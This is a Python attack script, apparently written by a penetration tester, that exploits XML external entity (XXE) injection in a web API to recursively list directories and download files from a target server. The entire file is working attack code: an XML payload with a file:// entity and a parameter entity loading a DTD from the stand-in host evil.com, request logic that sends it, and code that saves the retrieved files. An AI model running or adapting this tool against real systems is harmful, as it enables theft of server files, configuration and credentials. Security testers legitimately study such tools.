#!/usr/bin/env python

"""
Retrieves files via XXE.

Recursively obtains directory listings and file contents via XXE. Uses a
heuristic to detect directory listings: Directory listings are assumed to only
contain certain characters (see FILENAME_REGEX).

Only works if data is echoed back in response. Constants (HOST, URL, 
REQUEST_BODY, ..) and the _parse_response() method have to be adapted to the
specific XXE instance. You have to serve evil.dtd on a web server reachable by
the target and change the reference in REQUEST_BODY.

Possible improvements:
 - Option to send file contents on URL string (for blind XXE)
 - Save files AND directory listings (in case not all files could be retrieved)
 - Add command line arguments / config file:
   - Target URL
   - Load body template from file
   - Generate XXE payload (based on dtd url)
   - filename regex
 - Write logs to a file
"""

import argparse
import httplib
import re
import logging
import json
import os
import urllib

__author__ = "Georg Chalupar"
__email__ = "gchalupar@gdssecurity.com"

HOST = 'example.com:80'
URL = '/api/user'
HEADERS = {'Content-Type': 'application/xml', 'Accept': 'application/json'}
REQUEST_BODY = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE updateProfile [
   <!ENTITY % file SYSTEM "file://{path}">
   <!ENTITY % start "<![CDATA[">
   <!ENTITY % end "]]>">
   <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
%dtd;
]>
<user>
    <firstname>John</firstname>
    <surname>&xxe;</surname>
    <email>jdoe@redacted.com</email>
    <role>admin</role>
</user>"""
FILENAME_REGEX = '^[$.\-_~ 0-9A-Za-z]+$'


class XXEClient:

    def retrieve_file(self, path):
        """Recursively retrieve path"""
        logging.info('retrieving {}'.format(path))
        response = self._issue_request(path)
        if response.status != 200:
            logging.info("error code {}, skip".format(response.status))
            return None
        raw = response.read()
        logging.debug("response: {}".format(raw))
        content = self._parse_response(raw)
        logging.info("content: {}".format(content))
        found = False
        for f in content.splitlines():
            if re.match(FILENAME_REGEX, f): # treat as file and try downloading
                try:
                    if self.retrieve_file(path+f+'/') is not None:
                        found = True
                except Exception:
                    logging.exception('could not retrieve {}'.format(path+f+'/'))
                    pass
            else: # regex does not match: treat as a file
                break
        if not found:
            logging.info("looks like a file: {}".format(path))
            local_path = self._to_local_path(path)
            self._save_file(local_path, content)
        return content
            
    def _issue_request(self, path):
        """Send XXE payload to retrieve content of path"""
        conn = httplib.HTTPConnection(HOST)
        #conn.set_debuglevel(2)
        body = REQUEST_BODY.format(path=urllib.quote(path))
        conn.request("PUT", URL, body, HEADERS)
        response = conn.getresponse()
        return response

    def _parse_response(self, response):
        """Extract XXE result from HTTP response"""
        data = json.loads(response)['surname']
        return data.strip()

    def _to_local_path(self, path):
        """Convert to local path: strip leading and trailing '/' """
        if path.startswith('/'):
            local_path = path[1:]
        if local_path.endswith('/'):
            local_path = local_path[:-1]
        return local_path

    def _save_file(self, path, content):
        """Save content to file (create directories if they don't exist)"""
        logging.info("saving {}".format(path))
        parts = path.rsplit('/', 1)
        if len(parts) == 2:
            d = parts[0]
            logging.debug("creating dir {}".format(d))
            try:
                os.makedirs(d)
            except Exception:
                pass
        logging.debug("write to {}".format(path))
        with open(path, 'w') as f:
            f.write(content)


def main():
    logging.basicConfig(level=logging.DEBUG,
        format="%(asctime)s [%(levelname)-8s] %(message)s")
    parser = argparse.ArgumentParser(
        description='Retrieves files via XXE')
    parser.add_argument('path', nargs='+',
        help='path(s) to the retrieve (e.g. /etc/)')
    args = parser.parse_args()
    c = XXEClient()
    for p in args.path:
        c.retrieve_file(p)


if __name__ == "__main__":
    main()

